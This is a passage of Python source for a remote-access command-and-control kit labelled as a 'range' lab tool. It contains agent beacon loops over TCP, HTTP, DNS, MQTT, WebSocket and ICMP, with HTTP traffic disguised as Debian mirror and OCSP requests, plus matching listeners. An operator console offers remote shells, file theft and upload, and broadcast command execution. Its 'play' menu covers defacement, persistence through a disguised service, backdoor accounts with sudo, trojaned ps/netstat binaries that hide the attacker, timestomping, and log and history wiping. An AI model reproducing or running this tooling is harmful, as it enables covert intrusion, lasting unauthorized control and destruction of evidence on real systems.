            http_request(url, {"User-Agent": ua, "Cookie": "sid=" + agent.sid, "Accept": "*/*"})
            continue
        if windows:
            url = base + "/ocsp/status"
        else:
            url = base + "/debian/dists/bookworm/InRelease"
        body = http_request(url, {"User-Agent": ua, "Cookie": "sid=" + agent.sid, "Accept": "*/*"})
        text = None
        if body:
            text = parse_ocsp(body) if windows else parse_inrelease(body)
        if text:
            outbox.extend(agent.accept_json(text))
            continue
        if agent.tty:
            pending = agent.tty_poll_frames()
            if pending:
                outbox.extend(pending)
                continue
        if STOP.is_set():
            break
        agent.idle_sleep()


def agent_dns_loop(agent, host, port):
    outbox = []
    outbox.extend(agent.hello_frames())
    counter = 1
    while not STOP.is_set():
        if outbox:
            qname = dns_uplink_name(outbox.pop(0), agent.sid, agent.zone)
        else:
            qname = dns_poll_name(agent.sid, counter, agent.zone)
            counter += 1
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            tid = random.randint(1, 65535)
            sock.sendto(dns_build_query(tid, qname), (host, port))
            data, _addr = sock.recvfrom(4096)
            sock.close()
            txt = dns_parse_txt(data)
        except Exception:
            time.sleep(1)
            continue
        if is_long_hex(txt):
            try:
                text = from_hex(txt)
            except Exception:
                text = ""
            if text:
                produced = agent.accept_json(text)
                if produced:
                    outbox.extend(produced)
                    continue
                if agent.box.buf:
                    continue
        if outbox:
            continue
        if agent.tty:
            pending = agent.tty_poll_frames()
            if pending:
                outbox.extend(pending)
                continue
        if STOP.is_set():
            break
        if qname.startswith("u."):
            continue
        agent.idle_sleep()


def agent_duplex_send_loop(agent, send_text, recv_text):
    for frame in agent.hello_frames():
        send_text(frame)
    while not STOP.is_set():
        text = recv_text()
        if text is None:
            break
        if text == "":
            for frame in agent.tty_poll_frames():
                send_text(frame)
            continue
        for frame in agent.accept_json(text):
            send_text(frame)


def agent_tcp_loop(agent, host, port):
    while not STOP.is_set():
        try:
            sock = socket.create_connection((host, port), 5)
            sock.settimeout(2)
        except Exception:
            time.sleep(3)
            continue
        reader = PacketBuffer(sock)
        lock = threading.Lock()

        def send_text(text, sock=sock, lock=lock):
            with lock:
                sock.sendall(b64e(text).encode("ascii") + b"\n")

        def recv_text():
            try:
                line = reader.readline()
            except socket.timeout:
                return ""
            if line is None:
                return None
            if not line.strip():
                return ""
            try:
                return b64d(line)
            except Exception:
                return ""

        try:
            agent_duplex_send_loop(agent, send_text, recv_text)
        except Exception:
            pass
        try:
            sock.close()
        except Exception:
            pass
        time.sleep(3)


def agent_ws_loop(agent, host, port):
    while not STOP.is_set():
        try:
            sock = socket.create_connection((host, port), 5)
            sock.settimeout(2)
            ws_handshake_client(sock, host, port)
        except Exception:
            time.sleep(3)
            continue
        lock = threading.Lock()

        def send_text(text, sock=sock, lock=lock):
            with lock:
                ws_send(sock, b64e(text), True)

        def recv_text():
            try:
                message = ws_read_message(sock)
            except socket.timeout:
                return ""
            except Exception:
                return None
            if message is None:
                return None
            opcode, payload = message
            if opcode == 8:
                return None
            try:
                return b64d(payload.decode("ascii", "ignore"))
            except Exception:
                return ""

        try:
            agent_duplex_send_loop(agent, send_text, recv_text)
        except Exception:
            pass
        try:
            sock.close()
        except Exception:
            pass
        time.sleep(3)


def agent_mqtt_loop(agent, host, port):
    topic_in = "lab/{0}/in".format(agent.sid)
    topic_out = "lab/{0}/out".format(agent.sid)
    while not STOP.is_set():
        try:
            sock = socket.create_connection((host, port), 5)
            sock.settimeout(2)
            sock.sendall(mqtt_connect("range-" + agent.sid))
            reader = PacketBuffer(sock)
            ack = reader.read_mqtt()
            if not ack or mqtt_packet_type(ack) != 2:
                sock.close()
                time.sleep(3)
                continue
            sock.sendall(mqtt_subscribe(1, topic_in))
            sub = reader.read_mqtt()
            if not sub or mqtt_packet_type(sub) != 9:
                sock.close()
                time.sleep(3)
                continue
        except Exception:
            time.sleep(3)
            continue
        lock = threading.Lock()

        def send_text(text, sock=sock, lock=lock, topic_out=topic_out):
            packet = mqtt_publish(topic_out, b64e(text))
            with lock:
                sock.sendall(packet)

        def recv_text():
            try:
                packet = reader.read_mqtt()
            except socket.timeout:
                try:
                    with lock:
                        sock.sendall(b"\xc0\x00")
                except Exception:
                    return None
                return ""
            except Exception:
                return None
            if packet is None:
                return None
            kind = mqtt_packet_type(packet)
            if kind == 3:
                _topic, payload = mqtt_parse_publish(packet)
                try:
                    return b64d(payload)
                except Exception:
                    return ""
            if kind == 13:
                try:
                    with lock:
                        sock.sendall(b"\xd0\x00")
                except Exception:
                    return None
            return ""

        try:
            agent_duplex_send_loop(agent, send_text, recv_text)
        except Exception:
            pass
        try:
            sock.close()
        except Exception:
            pass
        time.sleep(3)


def agent_icmp_loop(agent, host):
    if os.name == "nt":
        log("icmp is Linux-only in this kit. On Windows use tcp, http, or ws.")
        return
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(2)
    except Exception as exc:
        log("icmp agent needs raw sockets: {0}".format(exc))
        return
    ident = icmp_ident(agent.sid)
    seq = 1
    outbox = []
    outbox.extend(agent.hello_frames())
    while not STOP.is_set():
        if outbox:
            uplink = b64e(outbox.pop(0))
            busy = True
        else:
            uplink = b64e(seal_obj("n", "", agent.sid, 0, 0, 1, agent.token))
            busy = bool(agent.box.buf)
        try:
            sock.sendto(icmp_packet(8, ident, seq, uplink), (host, 0))
        except Exception:
            time.sleep(1)
            continue
        seq = (seq + 1) & 0xFFFF
        deadline = time.time() + 3
        acted = False
        while time.time() < deadline and not STOP.is_set():
            try:
                data, _addr = sock.recvfrom(65535)
            except socket.timeout:
                break
            parsed = parse_icmp_packet(data)
            if not parsed:
                continue
            kind, rid, _seq, body, src = parsed
            if kind != 0 or rid != ident or src != host:
                continue
            try:
                text = b64d(body.decode("ascii", "ignore"))
            except Exception:
                continue
            if b64e(text) == uplink:
                continue
            obj = open_frame(text, agent.token)
            if not obj or obj["o"] not in ("x", "f", "n", "t"):
                continue
            if obj["o"] == "n":
                acted = True
                break
            outbox.extend(agent.accept_json(text))
            acted = True
            busy = True
            break
        if outbox or busy or agent.box.buf:
            continue
        if not acted:
            time.sleep(0.2)
            continue
        agent.idle_sleep()
    try:
        sock.close()
    except Exception:
        pass


def cookie_sid(header):
    if not header:
        return ""
    for part in header.split(";"):
        if "=" not in part:
            continue
        key, value = part.split("=", 1)
        if key.strip().lower() == "sid":
            return sanitize_id(value.strip())
    return ""


def make_http_handler(hub, token):
    class Handler(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.0"

        def log_message(self, fmt, *args):
            return

        def _sid(self):
            return cookie_sid(self.headers.get("Cookie", ""))

        def _body(self, text, code=200):
            data = text.encode("utf-8")
            self.send_response(code)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.send_header("Content-Length", str(len(data)))
            self.send_header("Connection", "close")
            self.end_headers()
            try:
                self.wfile.write(data)
            except (BrokenPipeError, ConnectionResetError, OSError):
                pass

        def _take_downlink(self, sid, channel):
            if not sid:
                return None
            frame = hub.pull(sid, channel)
            if not frame:
                return None
            return frame

        def do_GET(self):
            path = self.path.split("?", 1)[0]
            sid = self._sid()
            linux_up = "/debian/dists/bookworm/by-hash/SHA256/"
            win_up = "/ocsp/nonce/"
            if path.startswith(linux_up) or path.startswith(win_up):
                hexed = path.split("/")[-1]
                try:
                    text = from_hex(hexed)
                except Exception:
                    self._body("bad\n", 400)
                    return
                obj = open_frame(text, token)
                if not obj:
                    self._body("bad\n", 400)
                    return
                channel = "http"
                meta = obj["d"] if obj["o"] == "h" else None
                hub.touch(obj["i"], channel, meta, None)
                hub.ingest(obj)
                self._body("ok\n")
                return
            if path == "/debian/dists/bookworm/InRelease":
                frame = self._take_downlink(sid, "http") if sid else None
                if frame:
                    self._body(inrelease_body(to_hex(frame), len(frame)))
                else:
                    digest = idle_digest(sid or "mirror")
                    self._body(inrelease_body(digest, 2048))
                return
            if path == "/ocsp/status":
                frame = self._take_downlink(sid, "http") if sid else None
                if frame:
                    self._body(ocsp_body(to_hex(frame)))
                else:
                    self._body(ocsp_body(idle_digest(sid or "mirror")))
                return
            self._body("not found\n", 404)

        def do_POST(self):
            self._body("not found\n", 404)

    return Handler


class ReuseTCPServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True


def serve_http(hub, token, bind, port):
    handler = make_http_handler(hub, token)
    try:
        server = ReuseTCPServer((bind, port), handler)
    except OSError as exc:
        log("http {0}:{1} failed: {2}".format(bind, port, exc))
        return
    log("http listening on {0}:{1}".format(bind, port))
    server.serve_forever(poll_interval=0.5)


def serve_tcp(hub, token, bind, port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((bind, port))
        server.listen(40)
        server.settimeout(1)
    except OSError as exc:
        log("tcp {0}:{1} failed: {2}".format(bind, port, exc))
        return
    log("tcp listening on {0}:{1}".format(bind, port))
    while not STOP.is_set():
        try:
            conn, _addr = server.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        thread = threading.Thread(target=handle_tcp, args=(conn, hub, token))
        thread.daemon = True
        thread.start()
    server.close()


def handle_tcp(conn, hub, token):
    conn.settimeout(1)
    reader = PacketBuffer(conn)
    lock = threading.Lock()
    current = {"sid": None}

    def send_fn(text, conn=conn, lock=lock):
        with lock:
            conn.sendall(b64e(text).encode("ascii") + b"\n")

    try:
        while not STOP.is_set():
            try:
                line = reader.readline()
            except socket.timeout:
                continue
            if line is None:
                break
            if not line.strip():
                continue
            try:
                text = b64d(line)
            except Exception:
                continue
            obj = open_frame(text, token)
            if not obj:
                continue
            meta = obj["d"] if obj["o"] == "h" else None
            current["sid"] = hub.touch(obj["i"], "tcp", meta, send_fn)
            hub.ingest(obj)
    finally:
        if current["sid"]:
            hub.detach(current["sid"], send_fn)
        try:
            conn.close()
        except Exception:
            pass


def serve_ws(hub, token, bind, port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((bind, port))
        server.listen(40)
        server.settimeout(1)
    except OSError as exc:
        log("websocket {0}:{1} failed: {2}".format(bind, port, exc))
        return
    log("websocket listening on {0}:{1}{2}".format(bind, port, WS_PATH))
    while not STOP.is_set():
        try:
            conn, _addr = server.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        thread = threading.Thread(target=handle_ws, args=(conn, hub, token))
        thread.daemon = True
        thread.start()
    server.close()


def handle_ws(conn, hub, token):
    conn.settimeout(3)
    try:
        if not ws_handshake_server(conn):
            conn.close()
            return
    except Exception:
        try:
            conn.close()
        except Exception:
            pass
        return
    conn.settimeout(1)
    lock = threading.Lock()
    current = {"sid": None}

    def send_fn(text, conn=conn, lock=lock):
        with lock:
            ws_send(conn, b64e(text), False)

    try:
        while not STOP.is_set():
            try:
                message = ws_read_message(conn)
            except socket.timeout:
                continue
            except Exception:
                break
            if message is None:
                break
            opcode, payload = message
            if opcode == 8:
                break
            if opcode != 1:
                continue
            try:
                text = b64d(payload.decode("ascii", "ignore"))
            except Exception:
                continue
            obj = open_frame(text, token)
            if not obj:
                continue
            meta = obj["d"] if obj["o"] == "h" else None
            current["sid"] = hub.touch(obj["i"], "ws", meta, send_fn)
            hub.ingest(obj)
    finally:
        if current["sid"]:
            hub.detach(current["sid"], send_fn)
        try:
            conn.close()
        except Exception:
            pass


def serve_mqtt(hub, token, bind, port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((bind, port))
        server.listen(40)
        server.settimeout(1)
    except OSError as exc:
        log("mqtt {0}:{1} failed: {2}".format(bind, port, exc))
        return
    log("mqtt listening on {0}:{1}".format(bind, port))
    while not STOP.is_set():
        try:
            conn, _addr = server.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        thread = threading.Thread(target=handle_mqtt, args=(conn, hub, token))
        thread.daemon = True
        thread.start()
    server.close()


def handle_mqtt(conn, hub, token):
    conn.settimeout(1)
    reader = PacketBuffer(conn)
    lock = threading.Lock()
    current = {"sid": None}
    try:
        while not STOP.is_set():
            try:
                packet = reader.read_mqtt()
            except socket.timeout:
                continue
            if packet is None:
                break
            kind = mqtt_packet_type(packet)
            if kind == 1:
                with lock:
                    conn.sendall(b"\x20\x02\x00\x00")
            elif kind == 8:
                packet_id, topics = mqtt_parse_subscribe(packet)
                with lock:
                    conn.sendall(mqtt_suback(packet_id, len(topics)))
            elif kind == 12:
                with lock:
                    conn.sendall(b"\xd0\x00")
            elif kind == 3:
                topic, payload = mqtt_parse_publish(packet)
                if not topic.endswith("/out"):
                    continue
                try:
                    text = b64d(payload)
                except Exception:
                    continue
                obj = open_frame(text, token)
                if not obj:
                    continue
                sid = obj["i"]

                def send_fn(frame, conn=conn, lock=lock, sid=sid):
                    outbound = mqtt_publish("lab/{0}/in".format(sid), b64e(frame))
                    with lock:
                        conn.sendall(outbound)

                meta = obj["d"] if obj["o"] == "h" else None
                current["sid"] = hub.touch(sid, "mqtt", meta, send_fn)
                hub.ingest(obj)
            elif kind == 14:
                break
    finally:
        if current["sid"]:
            hub.detach(current["sid"], send_fn if False else None)
        # detach with the last send_fn identity is messy; drop by clearing any send on close
        with hub.lock:
            session = hub.sessions.get(current["sid"]) if current["sid"] else None
            if session:
                session["send"] = None
        try:
            conn.close()
        except Exception:
            pass


def serve_dns(hub, token, bind, port, zone):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((bind, port))
        sock.settimeout(1)
    except OSError as exc:
        log("dns {0}:{1} failed: {2}".format(bind, port, exc))
        return
    log("dns listening on {0}:{1} zone {2}".format(bind, port, zone))
    while not STOP.is_set():
        try:
            data, addr = sock.recvfrom(4096)
        except socket.timeout:
            continue
        except OSError:
            break
        try:
            qname, _end = dns_decode_name(data, 12)
            kind = dns_classify(qname, zone)
            if not kind:
                continue
            mode, sid, text = kind
            if mode == "up" and text:
                obj = open_frame(text, token)
                if not obj:
                    continue
                meta = obj["d"] if obj["o"] == "h" else None
                hub.touch(obj["i"], "dns", meta, None)
                hub.ingest(obj)
                reply_txt = idle_digest(obj["i"])
            else:
                frame = hub.pull(sid, "dns")
                reply_txt = to_hex(frame) if frame else idle_digest(sid)
            sock.sendto(dns_build_response(data, reply_txt), addr)
        except Exception:
            continue
    sock.close()


def serve_icmp(hub, token, bind):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        if bind and bind != "0.0.0.0":
            sock.bind((bind, 0))
        sock.settimeout(1)
    except Exception as exc:
        log("icmp not started ({0}). Other channels still work.".format(exc))
        return
    log("icmp listening (echo requests with lab frames)")
    while not STOP.is_set():
        try:
            data, _addr = sock.recvfrom(65535)
        except socket.timeout:
            continue
        except OSError:
            break
        parsed = parse_icmp_packet(data)
        if not parsed:
            continue
        kind, ident, seq, payload, src = parsed
        if kind != 8:
            continue
        try:
            text = b64d(payload.decode("ascii", "ignore"))
        except Exception:
            continue
        obj = open_frame(text, token)
        if not obj:
            continue
        if icmp_ident(obj["i"]) != ident:
            continue
        meta = obj["d"] if obj["o"] == "h" else None
        hub.touch(obj["i"], "icmp", meta, None)
        hub.ingest(obj)
        frame = hub.pull(obj["i"], "icmp")
        if not frame:
            frame = seal_obj("n", "", obj["i"], 0, 0, 1, token)
        try:
            sock.sendto(icmp_packet(0, ident, seq, b64e(frame)), (src, 0))
        except Exception:
            continue
    sock.close()


def start_listener(target, args):
    thread = threading.Thread(target=target, args=args)
    thread.daemon = True
    thread.start()
    return thread


def start_agent(agent, host, ports):
    channel = agent.channel
    if channel == "tcp":
        target = agent_tcp_loop
        args = (agent, host, ports["tcp"])
    elif channel == "http":
        target = agent_http_loop
        args = (agent, host, ports["http"])
    elif channel == "dns":
        target = agent_dns_loop
        args = (agent, host, ports["dns"])
    elif channel == "mqtt":
        target = agent_mqtt_loop
        args = (agent, host, ports["mqtt"])
    elif channel == "ws":
        target = agent_ws_loop
        args = (agent, host, ports["ws"])
    elif channel == "icmp":
        target = agent_icmp_loop
        args = (agent, host)
    else:
        raise SystemExit("unknown channel {0}".format(channel))
    thread = threading.Thread(target=target, args=args)
    thread.daemon = True
    thread.start()
    return thread


HELP = """
commands
  sessions                 list agents
  ports                    show listener ports
  use <id>                 select an agent
  back                     clear the selection
  profile continuous|off  stay up for the class, or stop the beacon
                           off checks again in about half an hour, so you can turn it back on
                           tcp, ws, and mqtt stay connected either way
  play look                show the web file, owner, and lock bits
  play deface              replace index and lock it; keep a copy outside the site
  play deface nobackup     same, without keeping a copy
  play undo                remove the lock and put the copy back
  play history [user]      tail bash history and the lines that look like hunting
  play persist             reboot-safe callback (mailq-local.service)
  play unpersist           remove that service
  play shell <user> vi|python|perl|bash
  play wall <message>      wall -n, no banner
  play account mail|games|news|backup
                           login shell, sudo, shadow hash. Password prints here only
  play cloak               copy bash over false and nologin (originals kept)
  play uncloak             put those two binaries back
  play veil [account]      wrap ps, ss, netstat, w, who. Hides IP, ports, that account
  play unveil              restore those five binaries
  play stamp [file] [ref]  touch -r so lab files match a system file
  play boot [user]         log the student off this host
  play logs                empty auth, syslog, nginx, wtmp, journal. History stays
  play logs all            same, and wipe bash history too
  shell                    line-by-line remote shell. cd sticks. nano will not
  tty                      real terminal on the guest. nano works. Ctrl-] detaches
  get <remote> [local]     copy a file off the guest
  put <local> <remote>     copy a file onto the guest
  broadcast <command>      run on every agent that is up
  <command>                run on the selected agent

Linux shell is bash. Windows shell is PowerShell.
tty is a real bash terminal, so nano and vi work. Use it on TCP, WebSocket, or MQTT.
On DNS, HTTP, or ICMP the same terminal exists, but nano will redraw slowly.
shell is one command at a time on every channel, with no terminal.
get and put move a file. Edit it here with nano, then put it back.
play logs leaves the files in place and zeroed. Empty is the point.
Deface looks for /var/www/html, nginx, /var/www, then IIS wwwroot.
Run the Linux agent as root if you want chattr, usermod, the service, or a log wipe.
Shell, cloak, and veil are Linux. Windows can do history, wall, account, boot, and logs.
The account password is printed on this console and is not in the Linux tasking.
Traffic is signed with the lab token but not encrypted.
""".strip()


def play_opts(kit, hub, account, user, shell_name, message, stamp_target, stamp_ref):
    pw_hash = ""
    if account:
        _plain, pw_hash = kit.account_hash(account)
    return {
        "user": user,
        "shell": shell_name,
        "message": message,
        "account": account,
        "pw_hash": pw_hash,
        "patterns": kit.veil_patterns(hub, account, user),
        "webroot": kit.webroot,
        "image_name": kit.image_name,
        "stamp_ref": stamp_ref or "/bin/ls",
        "stamp_target": stamp_target or "",
    }


def play_script(kind, sid, hub, kit, opts=None):
    osname = hub.os_of(sid)
    opts = opts or {}
    tradecraft = (
        "history", "persist", "unpersist", "shell", "wall", "account",
        "cloak", "uncloak", "veil", "unveil", "stamp", "boot", "logs",
    )
    if kind in tradecraft:
        if osname.startswith("win"):
            return windows_tradecraft(kind, opts)
        return linux_tradecraft(kind, opts)
    page = kit.page
    image_name = kit.image_name or None
    image_bytes = kit.image_bytes or None
    if osname.startswith("win"):
        return windows_script(kind, kit.webroot, page, image_name, image_bytes)
    return linux_script(kind, kit.webroot, page, image_name, image_bytes)


def parse_play(parts, line, actor):
    if len(parts) < 2:
        return None
    mode = parts[1]
    user = "defender"
    shell_name = "vi"
    message = ""
    stamp_target = ""
    stamp_ref = ""
    play_actor = ""
    if mode == "deface" and len(parts) > 2 and parts[2] == "nobackup":
        kind = "nobackup"
    elif mode in ("deface", "undo", "look", "persist", "unpersist", "cloak", "uncloak", "unveil"):
        kind = mode
    elif mode == "history":
        kind = mode
        if len(parts) > 2 and re_account(parts[2]):
            user = parts[2]
    elif mode == "shell":
        if len(parts) >= 4 and re_account(parts[2]) and parts[3] in SHELLS:
            user = parts[2]
            shell_name = parts[3]
        elif len(parts) == 3 and parts[2] in SHELLS:
            shell_name = parts[2]
        else:
            return None
        kind = mode
    elif mode == "wall":
        kind = mode
        bits = line.split(None, 2)
        message = bits[2] if len(bits) > 2 else ""
    elif mode == "account":
        if len(parts) < 3 or not re_account(parts[2]):
            return None
        kind = mode
        play_actor = parts[2]
    elif mode == "veil":
        kind = mode
        if len(parts) > 2 and re_account(parts[2]):
            play_actor = parts[2]
    elif mode == "boot":
        kind = mode
        if len(parts) > 2 and re_account(parts[2]):
            user = parts[2]
    elif mode == "stamp":
        kind = mode
        if len(parts) > 2:
            stamp_target = parts[2]
        if len(parts) > 3:
            stamp_ref = parts[3]
    elif mode == "logs":
        kind = mode
    else:
        return None
    return kind, play_actor, user, shell_name, message, stamp_target, stamp_ref, mode == "logs" and len(parts) > 2 and parts[2] == "all"


def strip_rc(text):
    if not text:
        return ""
    idx = text.rfind("[rc=")
    if idx >= 0 and text.rstrip().endswith("]"):
        return text[:idx]
    return text


def cmd_get(hub, sid, remote, local):
    if not re_path(remote):
        log("remote path must start with / and must not contain ..")
        return
    windows = hub.os_of(sid).startswith("win")
    if windows:
        size_cmd = "(Get-Item -LiteralPath {0}).Length".format(ps_quote(remote))
    else:
        size_cmd = "stat -c %s {0}".format(shell_quote(remote))
    size_text = strip_rc(hub.exec_cmd(sid, size_cmd, 30)).strip()
    try:
        size = int(size_text.splitlines()[-1].strip())
    except Exception:
        log("could not read that file")
        log(size_text[:300])
        return
    if size > 8 * 1024 * 1024:
        log("refusing a file over 8MB")
        return
    blob = b""
    offset = 0
    step = 9000
    while offset < size:
        count = min(step, size - offset)
        if windows:
            script = (
                "$fs = [IO.File]::OpenRead({path})\n"
                "[void]$fs.Seek({off}, 'Begin')\n"
                "$buf = New-Object byte[] {n}\n"
                "$got = $fs.Read($buf, 0, {n})\n"
                "$fs.Close()\n"
                "if ($got -lt 1) {{ Write-Output '' }} else {{\n"
                "  if ($got -lt {n}) {{ $buf = $buf[0..($got-1)] }}\n"
                "  [Convert]::ToBase64String($buf)\n"
                "}}\n"
            ).format(path=ps_quote(remote), off=offset, n=count)
        else:
            script = "dd if={path} bs=1 skip={off} count={n} 2>/dev/null | base64 -w 0\n".format(
                path=shell_quote(remote), off=offset, n=count
            )
        piece = strip_rc(hub.exec_cmd(sid, script, 60))
        try:
            raw = base64.b64decode("".join(piece.split()))
        except Exception:
            log("download stopped at byte {0}".format(offset))
            return
        if not raw:
            break
        blob += raw
        offset += len(raw)
        if len(raw) < count:
            break
    parent = os.path.dirname(os.path.abspath(local))
    if parent and not os.path.isdir(parent):
        os.makedirs(parent)
    with open(local, "wb") as handle:
        handle.write(blob)
    log("got {0} bytes -> {1}".format(len(blob), local))


def cmd_put(hub, sid, local, remote):
    if not os.path.isfile(local):
        log("no local file {0}".format(local))
        return
    if not re_path(remote):
        log("remote path must start with / and must not contain ..")
        return
    with open(local, "rb") as handle:
        data = handle.read()
    if len(data) > 1500000:
        log("refusing a file over 1.5MB. Use TCP, WebSocket, or MQTT for anything large.")
        return
    b64 = b64_lines(data)
    if hub.os_of(sid).startswith("win"):
        script = (
            "$path = {path}\n"
            "$dir = Split-Path -Parent $path\n"
            "if ($dir) {{ New-Item -ItemType Directory -Path $dir -Force | Out-Null }}\n"
            "if (Test-Path -LiteralPath $path) {{ attrib -R $path | Out-Null }}\n"
            "$bytes = [Convert]::FromBase64String('{b64}')\n"
            "[IO.File]::WriteAllBytes($path, $bytes)\n"
            "Write-Output ('WROTE=' + $path + ' BYTES=' + $bytes.Length)\n"
        ).format(path=ps_quote(remote), b64="".join(b64.split()))
    else:
        script = (
            "dest={path}\n"
            "mkdir -p \"$(dirname \"$dest\")\"\n"
            "if command -v chattr >/dev/null 2>&1; then chattr -i \"$dest\" 2>/dev/null || true; fi\n"
            "base64 -d > \"$dest\" << 'RANGEPUT'\n{b64}\nRANGEPUT\n"
            "echo WROTE=$dest BYTES=$(wc -c < \"$dest\")\n"
        ).format(path=shell_quote(remote), b64=b64)
    log(hub.exec_cmd(sid, script, CMD_TIMEOUT).rstrip("\n"))


def line_shell(hub, sid):
    log("line shell on {0}. Each line is one command. cd sticks. nano needs tty. exit returns.".format(sid))
    while not STOP.is_set():
        try:
            line = input("range {0} $ ".format(sid))
        except EOFError:
            print("")
            return
        except KeyboardInterrupt:
            print("")
            return
        if line.strip() in ("exit", "quit"):
            return
        if not line.strip():
            continue
        log(hub.exec_cmd(sid, line, CMD_TIMEOUT).rstrip("\n"))


def run_tty(hub, sid):
    if os.name == "nt" or not sys.stdin.isatty():
        log("this side has no terminal. Use shell, or get the file and edit it here.")
        return
    import termios
    import tty

    try:
        size = os.get_terminal_size()
        rows, cols = size.lines, size.columns
    except Exception:
        rows, cols = 24, 80
    channel = hub.channel_of(sid)
    if channel not in ("tcp", "ws", "mqtt"):
        log("{0} will redraw slowly. tcp, ws, or mqtt are the ones for nano.".format(channel))
    log("remote terminal. Ctrl-] detaches and stops that shell. Your own Ctrl-C goes to the guest.")
    hub.term_send(sid, "1:{0}:{1}".format(rows, cols))
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        while not STOP.is_set():
            blob, closed = hub.term_take(sid)
            if blob:
                os.write(sys.stdout.fileno(), blob)
            if closed:
                break
            ready, _, _ = select.select([fd], [], [], 0.1)
            if not ready:
                continue
            data = os.read(fd, 512)
            if not data:
                break
            if b"\x1d" in data:
                data = data.replace(b"\x1d", b"")
                if data:
                    hub.term_send(sid, "2:" + b64e(data))
                break
            hub.term_send(sid, "2:" + b64e(data))
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
        hub.term_send(sid, "0")
        sys.stdout.write("\n")
    log("left the remote terminal")


def repl(hub, kit):
    selected = None
    actor = "mail"
    log("type help. Agents show up after their first check-in.")
    while not STOP.is_set():
        prompt = "range"
        if selected:
            prompt += " " + selected
        try:
            line = input(prompt + "> ")
        except EOFError:
            print("")
            return
        except KeyboardInterrupt:
            print("")
            return
        line = line.strip()
        if not line:
            continue
        if line in ("quit", "exit"):
            return
        if line == "help":
            log(HELP)
            continue
        if line == "sessions":
            log(hub.format_sessions())
            continue
        if line == "ports":
            for name in ("tcp", "http", "dns", "mqtt", "ws"):
                log("{0} {1}".format(name, hub.ports.get(name)))
            log("icmp echo (raw)")
            log("dns zone {0}".format(hub.zone))
            continue
        parts = line.split()
        if parts[0] == "use" and len(parts) >= 2:
            selected = sanitize_id(parts[1])
            log("using {0}".format(selected))
            continue
        if parts[0] == "back":
            selected = None
            continue
        if parts[0] == "profile" and len(parts) == 2 and parts[1] in ("continuous", "off", "live", "hunt"):
            targets = [selected] if selected else hub.online_ids()
            if not targets:
                log("no agent selected")
                continue
            for sid in targets:
                hub.set_profile(sid, parts[1])
                log("{0} profile {1} queued".format(sid, parts[1]))
            continue
        if parts[0] == "broadcast":
            command = line[len("broadcast") :].strip()
            targets = hub.online_ids()
            if not command or not targets:
                log("nothing to run")
                continue
            for sid in targets:
                log("---- {0} ----".format(sid))
                log(hub.exec_cmd(sid, command, CMD_TIMEOUT).rstrip("\n"))
            continue
        if parts[0] == "play":
            parsed = parse_play(parts, line, actor)
            if not parsed:
                log("usage: play look | deface [nobackup] | undo | history | persist | shell | wall | account | cloak | veil | stamp | boot")
                log("type help for the full list")
                continue
            kind, play_actor, user, shell_name, message, stamp_target, stamp_ref, wipe_history = parsed
            if play_actor:
                actor = play_actor
            targets = [selected] if selected else hub.online_ids()
            if len(targets) != 1:
                log("use <id> first (play runs on one agent)")
                continue
            sid = targets[0]
            if hub.profile_of(sid) == "off" and kind not in ("look", "history"):
                log("this agent is off. profile continuous first. It hears that on the next quiet check.")
            opts = play_opts(kit, hub, actor, user, shell_name, message, stamp_target, stamp_ref)
            opts["all"] = wipe_history
            if kind == "account" and not hub.os_of(sid).startswith("win"):
                plain, _hashed = kit.account_hash(actor)
                log("login for {0} is local only (not in the tasking): {1}".format(actor, plain))
            script = play_script(kind, sid, hub, kit, opts)
            log(hub.exec_cmd(sid, script, CMD_TIMEOUT).rstrip("\n"))
            continue
        if parts[0] == "shell" and len(parts) == 1:
            targets = [selected] if selected else hub.online_ids()
            if len(targets) != 1:
                log("use <id> first")
                continue
            line_shell(hub, targets[0])
            continue
        if parts[0] == "tty" and len(parts) == 1:
            targets = [selected] if selected else hub.online_ids()
            if len(targets) != 1:
                log("use <id> first")
                continue
            run_tty(hub, targets[0])
            continue
        if parts[0] == "get" and len(parts) in (2, 3):
            targets = [selected] if selected else hub.online_ids()
            if len(targets) != 1:
                log("use <id> first")
                continue
            remote = parts[1]
            local = parts[2] if len(parts) == 3 else os.path.basename(remote)
            cmd_get(hub, targets[0], remote, local)
            continue
        if parts[0] == "put" and len(parts) == 3:
            targets = [selected] if selected else hub.online_ids()
            if len(targets) != 1:
                log("use <id> first")
                continue
            cmd_put(hub, targets[0], parts[1], parts[2])
            continue
        targets = [selected] if selected else hub.online_ids()
        if len(targets) != 1:
            log("use <id> first")
            continue
        log(hub.exec_cmd(targets[0], line, CMD_TIMEOUT).rstrip("\n"))


def load_config(path):
    with open(path, "r") as handle:
        data = json.load(handle)
    if not isinstance(data, dict):
        raise SystemExit("config must be a JSON object")
    return data


def cfg_get(cfg, key, default):
    if not cfg or key not in cfg or cfg[key] in (None, ""):
        return default
    return cfg[key]


def build_operator(args):
    cfg = load_config(args.config) if args.config else {}
    token = args.token or cfg_get(cfg, "token", "")
    if len(str(token)) < 8:
        raise SystemExit("token must be at least 8 characters")
    ports = {
        "tcp": int(args.tcp_port or cfg_get(cfg, "tcp_port", 443)),
        "http": int(args.http_port or cfg_get(cfg, "http_port", 80)),
        "dns": int(args.dns_port or cfg_get(cfg, "dns_port", 53)),
